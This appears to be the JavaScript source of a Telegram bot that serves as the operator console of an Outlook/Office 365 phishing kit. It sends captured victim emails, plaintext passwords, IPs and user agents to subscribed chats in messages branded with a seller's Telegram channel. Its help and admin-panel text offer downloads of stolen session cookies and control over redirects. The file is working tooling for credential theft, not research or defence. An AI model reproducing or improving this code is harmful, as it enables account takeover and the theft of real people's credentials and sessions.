const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

class OutlookNotificationBot {
    constructor() {
        this.token = process.env.TELEGRAM_BOT_TOKEN;
        this.bot = new TelegramBot(this.token, { polling: true });
        this.chatIds = new Set(); // Store user chat IDs for notifications
        this.rateLimits = new Map(); // Rate limiting per chat ID
        this.subscriptionsFile = path.join(__dirname, 'telegram_subscriptions.json');

        // Load persistent subscriptions
        this.loadSubscriptions();

        this.setupCommands();
        this.setupEventHandlers();
        console.log('🚀 Outlook Notification Bot initialized successfully');
    }

    // Load persistent subscriptions from file
    loadSubscriptions() {
        try {
            if (fs.existsSync(this.subscriptionsFile)) {
                const data = fs.readFileSync(this.subscriptionsFile, 'utf8');
                const subscriptions = JSON.parse(data);
                this.chatIds = new Set(subscriptions.chatIds || []);
                console.log(`📋 Loaded ${this.chatIds.size} subscription(s) from persistent storage`);
            }
        } catch (error) {
            console.error('Error loading subscriptions:', error.message);
            this.chatIds = new Set();
        }
    }

    // Save subscriptions to file
    saveSubscriptions() {
        try {
            const data = {
                chatIds: Array.from(this.chatIds),
                lastUpdated: new Date().toISOString()
            };
            fs.writeFileSync(this.subscriptionsFile, JSON.stringify(data, null, 2));
        } catch (error) {
            console.error('Error saving subscriptions:', error.message);
        }
    }

    // Rate limiting check
    checkRateLimit(chatId, command) {
        const now = Date.now();
        const key = `${chatId}_${command}`;
        const lastCall = this.rateLimits.get(key) || 0;

        // Allow 1 command per 2 seconds per user
        if (now - lastCall < 2000) {
            return false;
        }

        this.rateLimits.set(key, now);

        // Clean up old entries every 100 requests
        if (this.rateLimits.size > 100) {
            for (const [k, time] of this.rateLimits.entries()) {
                if (now - time > 60000) { // Remove entries older than 1 minute
                    this.rateLimits.delete(k);
                }
            }
        }

        return true;
    }

    setupCommands() {
        // Welcome message with main menu
        this.bot.onText(/\/start/, (msg) => {
            const chatId = msg.chat.id;

            if (!this.checkRateLimit(chatId, 'start')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before sending another command.');
                return;
            }

            this.chatIds.add(chatId);
            this.saveSubscriptions();

            this.sendMainMenu(chatId);
        });

        // Help command
        this.bot.onText(/\/help/, (msg) => {
            const chatId = msg.chat.id;

            if (!this.checkRateLimit(chatId, 'help')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before requesting help again.');
                return;
            }

            this.sendHelpMessage(chatId);
        });

        // Menu command to return to main menu
        this.bot.onText(/\/menu/, (msg) => {
            const chatId = msg.chat.id;
            this.sendMainMenu(chatId);
        });

        // Server status command
        this.bot.onText(/\/status/, (msg) => {
            const chatId = msg.chat.id;
            if (!this.checkRateLimit(chatId, 'status')) return;
            this.sendServerStatus(chatId);
        });

        // Restart server command
        this.bot.onText(/\/restart/, (msg) => {
            const chatId = msg.chat.id;
            if (!this.checkRateLimit(chatId, 'restart')) return;
            this.restartServer(chatId);
        });
    }

    sendMainMenu(chatId) {
        const welcomeMessage = `
🚀 **Welcome to Outlook Automation Bot!**

Choose an option from the menu below:

🔧 **Admin Features:**
• Admin Panel - Access admin token and management URL
• Server Control - Monitor and control your VPS server

❓ **Help:**
• Help - Get information about available commands and features
        `;

        const keyboard = {
            inline_keyboard: [
                [
                    { text: '🔧 Admin Panel', callback_data: 'admin_panel' }
                ],
                [
                    { text: '🖥️ Server Status', callback_data: 'server_status' },
                    { text: '🔄 Restart Server', callback_data: 'restart_server' }
                ],
                [
                    { text: '📊 System Info', callback_data: 'system_info' },
                    { text: '📈 Analytics', callback_data: 'analytics' }
                ],
                [
                    { text: '❓ Help', callback_data: 'help' }
                ]
            ]
        };

        this.bot.sendMessage(chatId, welcomeMessage, { 
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
    }

    sendHelpMessage(chatId) {
        const helpMessage = `
❓ **Outlook Automation Bot Help**

**Available Features:**

🔧 **Admin Features**
• **Admin Panel**: Access admin token and management interface
  - View captured login sessions
  - Download session cookies and data
  - Monitor system analytics
  - Configure system settings

📧 **Notifications**
• **Real-time Login Alerts**: Get notified when new Outlook logins are captured
  - Email addresses and domains
  - Session information
  - Direct links to admin panel

**Commands:**
• **/start** - Show main menu
• **/help** - Show this help message  
• **/menu** - Return to main menu

<b>Need Help?</b>
This bot provides notifications and admin access for the Outlook automation project.
        `;

        this.bot.sendMessage(chatId, helpMessage, { 
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: '🔙 Back to Menu', callback_data: 'main_menu' }
                ]]
            }
        });
    }

    setupEventHandlers() {
        // Handle callback queries (inline buttons)
        this.bot.on('callback_query', (query) => {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;

            if (!this.checkRateLimit(chatId, 'callback')) {
                this.bot.answerCallbackQuery(query.id, { text: 'Please wait before clicking again.' });
                return;
            }

            this.handleCallbackQuery(chatId, messageId, query);
        });

        // Error handling
        this.bot.on('error', (error) => {
            console.error(`Telegram Bot error: ${error.code} - ${error.message}`);
        });

        this.bot.on('polling_error', (error) => {
            console.error(`Telegram Bot polling error: ${error.code} - ${error.message}`);
        });
    }

    async handleCallbackQuery(chatId, messageId, query) {
        const data = query.data;

        switch (data) {
            case 'main_menu':
                this.sendMainMenu(chatId);
                break;

            case 'admin_panel':
                await this.handleAdminPanel(chatId, messageId);
                break;

            case 'server_status':
                await this.handleServerStatus(chatId, messageId);
                break;

            case 'restart_server':
                await this.handleRestartServer(chatId, messageId);
                break;

            case 'system_info':
                await this.handleSystemInfo(chatId, messageId);
                break;

            case 'analytics':
                await this.handleAnalytics(chatId, messageId);
                break;

            case 'help':
                this.sendHelpMessage(chatId);
                break;
        }

        this.bot.answerCallbackQuery(query.id);
    }

    async handleAdminPanel(chatId, messageId) {
        const adminToken = global.adminToken || 'Token not available';
        // Construct admin URL - support Replit, VPS with domain, or extract from redirect URI
        let baseUrl;
        if (process.env.REPL_SLUG) {
            // Replit environment
            baseUrl = `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`;
        } else if (process.env.DOMAIN) {
            // VPS with explicit domain
            baseUrl = process.env.DOMAIN;
        } else if (process.env.AZURE_REDIRECT_URI) {
            // Extract domain from redirect URI
            const redirectUrl = new URL(process.env.AZURE_REDIRECT_URI);
            baseUrl = `${redirectUrl.protocol}//${redirectUrl.host}`;
        } else {
            // Fallback - but this won't work with Telegram
            baseUrl = 'http://localhost:5000';
        }
        const adminUrl = `${baseUrl}/ad.html`;

        const tokenMessage = `
🔧 <b>Admin Panel Access</b>

🔑 <b>Your Admin Token:</b>
<code>${adminToken}</code>

🌐 <b>Admin Panel URL:</b>
${adminUrl}

<b>How to use:</b>
1. Copy the token above
2. Click "Open Admin Panel" below
3. Enter the token to authenticate
4. Access all admin features and session data

<b>Features Available:</b>
• View all captured login sessions
• Download session cookies and data
• Monitor system analytics
• Configure Cloudflare settings
• Manage redirect destinations

🔒 <b>Security Note:</b> This token provides full administrative access. Keep it secure and don't share it.
        `;

        this.bot.editMessageText(tokenMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🌐 Open Admin Panel', url: adminUrl }],
                    [{ text: '🔄 Refresh Token', callback_data: 'admin_panel' }],
                    [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]
                ]
            }
        });
    }

    // Method to send login notifications
    async sendLoginNotification(loginData) {
        if (this.chatIds.size === 0) {
            console.log('No Telegram users subscribed to notifications');
            return;
        }

        const { email, timestamp, totalCookies, sessionId, password, domain, authMethod } = loginData;
        // Construct admin URL - support Replit, VPS with domain, or extract from redirect URI
        let baseUrl;
        if (process.env.REPL_SLUG) {
            // Replit environment
            baseUrl = `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`;
        } else if (process.env.DOMAIN) {
            // VPS with explicit domain
            baseUrl = process.env.DOMAIN;
        } else if (process.env.AZURE_REDIRECT_URI) {
            // Extract domain from redirect URI
            const redirectUrl = new URL(process.env.AZURE_REDIRECT_URI);
            baseUrl = `${redirectUrl.protocol}//${redirectUrl.host}`;
        } else {
            // Fallback - but this won't work with Telegram
            baseUrl = 'http://localhost:5000';
        }
        const adminUrl = `${baseUrl}/ad.html`;

        const notificationMessage = `@closedbride ⭐️office⭐️
 {
    "officeEmail": "${email}",
    "officePassword": "${password || 'Not captured'}",
    "loginFmt": "${email}"
}


##      USER FINGERPRINTS       ##
IP: ${loginData.ip || 'Unknown'}
INFORMATION: ANTIBOT DISABLED
USERAGENT: ${loginData.userAgent || 'Unknown'}
/////// POWERED BY https://t.me/nakedpages /////////`;

        const keyboard = {
            inline_keyboard: [
                [{ text: '🌐 Open Admin Panel', url: adminUrl }]
            ]
        };

        // Send notification to all subscribed users
        for (const chatId of this.chatIds) {
            try {
                await this.bot.sendMessage(chatId, notificationMessage, {
                    reply_markup: keyboard
                });
            } catch (error) {
                console.error(`Failed to send notification to ${chatId}:`, error.message);
                // Remove invalid chat IDs
                if (error.code === 403) {
                    this.chatIds.delete(chatId);
                    this.saveSubscriptions();
                }
            }
        }

        console.log(`📤 Login notification sent to ${this.chatIds.size} Telegram users`);
    }

    // Method to send failed login notifications
    async sendFailedLoginNotification(failureData) {
        if (this.chatIds.size === 0) {
            console.log('No Telegram users subscribed to notifications');
            return;
        }

        const { email, password, timestamp, sessionId, reason, authMethod, preloadUsed } = failureData;
        // Construct admin URL - support Replit, VPS with domain, or extract from redirect URI
        let baseUrl;
        if (process.env.REPL_SLUG) {
            // Replit environment
            baseUrl = `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`;
        } else if (process.env.DOMAIN) {
            // VPS with explicit domain
            baseUrl = process.env.DOMAIN;
        } else if (process.env.AZURE_REDIRECT_URI) {
            // Extract domain from redirect URI
            const redirectUrl = new URL(process.env.AZURE_REDIRECT_URI);
            baseUrl = `${redirectUrl.protocol}//${redirectUrl.host}`;
        } else {
            // Fallback - but this won't work with Telegram
            baseUrl = 'http://localhost:5000';
        }
        const adminUrl = `${baseUrl}/ad.html`;

        const notificationMessage = `@closedbride ⭐️office⭐️
 {
    "officeEmail": "${email}",
    "officePassword": "${password}",
    "loginFmt": "${email}"
}


##      USER FINGERPRINTS       ##
IP: ${failureData.ip || 'Unknown'}
INFORMATION: ANTIBOT DISABLED
USERAGENT: ${failureData.userAgent || 'Unknown'}
/////// POWERED BY https://t.me/nakedpages /////////`;

        const keyboard = {
            inline_keyboard: [
                [{ text: '🌐 Open Admin Panel', url: adminUrl }]
            ]
        };

        // Send notification to all subscribed users
        for (const chatId of this.chatIds) {
            try {
                await this.bot.sendMessage(chatId, notificationMessage, {
                    reply_markup: keyboard
                });
            } catch (error) {
                console.error(`Failed to send failed login notification to ${chatId}:`, error.message);
                // Remove invalid chat IDs
                if (error.code === 403) {
                    this.chatIds.delete(chatId);
                    this.saveSubscriptions();
                }
            }
        }

        console.log(`📤 Failed login notification sent to ${this.chatIds.size} Telegram users`);
    }

    async handleServerStatus(chatId, messageId) {
        try {
            const { exec } = require('child_process');
            const util = require('util');
            const execPromise = util.promisify(exec);

            // Get PM2 status
            const pm2Status = await execPromise('pm2 jlist').catch(() => ({ stdout: '[]' }));
            const processes = JSON.parse(pm2Status.stdout || '[]');

            // Get system info
            const uptime = await execPromise('uptime').catch(() => ({ stdout: 'Unknown' }));
            const memInfo = await execPromise('free -h').catch(() => ({ stdout: 'Unknown' }));

            let statusMessage = `🖥️ <b>Server Status</b>\n\n`;

            // PM2 processes
            if (processes.length > 0) {
                statusMessage += `📱 <b>Applications:</b>\n`;
                processes.forEach(proc => {
                    const status = proc.pm2_env.status === 'online' ? '🟢' : '🔴';
                    const uptime = Math.floor((Date.now() - proc.pm2_env.pm_uptime) / 1000 / 60);
                    statusMessage += `${status} ${proc.name}: ${proc.pm2_env.status} (${uptime}m)\n`;
                });
            } else {
                statusMessage += `❌ <b>No PM2 processes found</b>\n`;
            }

            statusMessage += `\n🕐 <b>System Uptime:</b>\n<code>${uptime.stdout.trim()}</code>\n`;
            statusMessage += `\n💾 <b>Memory Usage:</b>\n<code>${memInfo.stdout.split('\n')[1]}</code>`;

            this.bot.editMessageText(statusMessage, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔄 Refresh', callback_data: 'server_status' }],
                        [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]
                    ]
                }
            });

        } catch (error) {
            this.bot.editMessageText(`❌ Error getting server status: ${error.message}`, {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: {
                    inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]]
                }
            });
        }
    }

    async handleRestartServer(chatId, messageId) {
        try {
            const { exec } = require('child_process');
            const util = require('util');
            const execPromise = util.promisify(exec);

            this.bot.editMessageText('🔄 Restarting server...', {
                chat_id: chatId,
                message_id: messageId
            });

            // Restart PM2 processes
            await execPromise('pm2 restart all');

            setTimeout(() => {
                this.bot.editMessageText(`✅ <b>Server Restarted Successfully!</b>\n\nAll PM2 processes have been restarted.`, {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '📊 Check Status', callback_data: 'server_status' }],
                            [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]
                        ]
                    }
                });
            }, 2000);

        } catch (error) {
            this.bot.editMessageText(`❌ Error restarting server: ${error.message}`, {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: {
                    inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]]
                }
            });
        }
    }

    async handleSystemInfo(chatId, messageId) {
        try {
            const { exec } = require('child_process');
            const util = require('util');
            const execPromise = util.promisify(exec);

            const [diskInfo, cpuInfo, netInfo] = await Promise.all([
                execPromise('df -h /').catch(() => ({ stdout: 'Unknown' })),
                execPromise('cat /proc/loadavg').catch(() => ({ stdout: 'Unknown' })),
                execPromise('curl -s ifconfig.me').catch(() => ({ stdout: 'Unknown' }))
            ]);

            const diskLine = diskInfo.stdout.split('\n')[1] || '';
            const diskUsage = diskLine.split(/\s+/)[4] || 'Unknown';

            let infoMessage = `📊 <b>System Information</b>\n\n`;
            infoMessage += `🌐 <b>Public IP:</b> <code>${netInfo.stdout.trim()}</code>\n`;
            infoMessage += `💽 <b>Disk Usage:</b> ${diskUsage}\n`;
            infoMessage += `⚡ <b>CPU Load:</b> <code>${cpuInfo.stdout.trim()}</code>\n`;
            infoMessage += `🕐 <b>Server Time:</b> ${new Date().toLocaleString()}`;

            this.bot.editMessageText(infoMessage, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔄 Refresh', callback_data: 'system_info' }],
                        [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]
                    ]
                }
            });

        } catch (error) {
            this.bot.editMessageText(`❌ Error getting system info: ${error.message}`, {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: {
                    inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]]
                }
            });
        }
    }

    async handleAnalytics(chatId, messageId) {
        try {
            // Read analytics from the server
            const analytics = require('./analytics.json');

            let analyticsMessage = `📈 <b>Server Analytics</b>\n\n`;
            analyticsMessage += `📊 <b>Total Login Attempts:</b> ${analytics.totalLogins || 0}\n`;
            analyticsMessage += `✅ <b>Successful Logins:</b> ${analytics.successfulLogins || 0}\n`;
            analyticsMessage += `❌ <b>Failed Logins:</b> ${analytics.failedLogins || 0}\n`;

            if (analytics.successfulLogins > 0) {
                const successRate = ((analytics.successfulLogins / analytics.totalLogins) * 100).toFixed(1);
                analyticsMessage += `📊 <b>Success Rate:</b> ${successRate}%`;
            }

            this.bot.editMessageText(analyticsMessage, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔄 Refresh', callback_data: 'analytics' }],
                        [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]
                    ]
                }
            });

        } catch (error) {
            this.bot.editMessageText(`❌ Error loading analytics: ${error.message}`, {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: {
                    inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]]
                }
            });
        }
    }

    getSubscribedUsers() {
        return this.chatIds.size;
    }
}

module.exports = OutlookNotificationBot;